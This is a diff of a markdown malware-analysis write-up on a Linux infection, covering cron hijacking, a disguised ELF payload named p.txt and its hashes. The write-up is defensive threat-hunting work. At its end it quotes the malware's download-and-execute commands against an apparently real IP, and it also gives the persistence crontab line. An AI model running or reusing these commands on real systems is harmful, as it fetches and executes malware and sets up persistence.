@@ -270,7 +270,7 @@ The cron job executed every ~60 seconds
 It repeatedly spawned hidden payloads in /var/tmp
 This activity was automated and non-interactive
 
-### .b4nd1d0 & diicot
+### .b4nd1d0 
 - a _leetspeak_ spelling of "Bandito"
 - Known Malware Associations
    - .b4nd1d0 has been observed in real Linux malware families in the wild
@@ -311,32 +311,48 @@ Tools like crontab - write to temp files first, then rename them into place.
 That explains the frequent FileCreated + FileRenamed events — the malware is adding a scheduled job.
 
 The malware edits /etc/crontab to remove old references to gcc.sh and add a new entry:
-*/3 * * * * root /etc/cron.hourly/gcc.sh
-This ensures the malware executes every 3 minutes.
-This explains why cron is still active but “drowned out” — it’s being overwritten and hijacked by the malware.
+   -*/3 * * * * root /etc/cron.hourly/gcc.sh
+   - malware will run every 3 minutes
 
-✅ Key points from this activity
-Persistent scheduling: malware hijacks cron and cron.hourly.
-Multi-stage deployment: initial payload (ygljglkjgfg0) spawns additional binaries.
-Self-replication: copies itself to multiple locations for redundancy.
-Remote fetch: uses curl/wget to pull more binaries.
-Cleanup & rename: old cron temp files are renamed/removed to hide traces.
+   - <br>
+   
+---
 
+<br>
+
+### p.txt SHA256 Hashes
+<br>
+
+- p.txt observations:
+   - downloaded on two different devices
+   - from same IP `23.160.56.194`
+   - to the same file name `ygljglkjgfg`
+   - on 1/27 and 2/2
+   - both with the same file size `548616`
+   - but with two different SHA256
+ 
 <br>
 
 <img width="1185" height="111" alt="image" src="https://github.com/user-attachments/assets/34ab995b-7b97-4eb8-9bc6-5828c76611c3" />
 
-<img width="1280" height="647" alt="image" src="https://github.com/user-attachments/assets/987eede9-ed10-45ce-b751-6016c6f32762" />
-
-<img width="1280" height="644" alt="image" src="https://github.com/user-attachments/assets/37e734b4-a72d-4f33-ac52-817bbc5ea215" />
-
-
-
+<br>
+  
 - Keep the same URL so all infected machines keep pulling the “latest version”
 - FileType: Elf (Executable and Linkable Format) even though it's named .txt
    - Not actually a text file, but a compiled Linux binary
    - Name file .txt to avoid suspicion
-   - Download → Rename → Execute 
+   - Download → Rename → Execute
+
+ **VirusTotal page for both SHA256 Hashes**    
+<img width="1280" height="647" alt="image" src="https://github.com/user-attachments/assets/987eede9-ed10-45ce-b751-6016c6f32762" /> <br>
+
+<img width="1280" height="644" alt="image" src="https://github.com/user-attachments/assets/37e734b4-a72d-4f33-ac52-817bbc5ea215" />
+
+<br>
+
+
+
+
 
 - curl http://23.160.56.194/p.txt -o ygljglkjgfg0
 ./ygljglkjgfg0
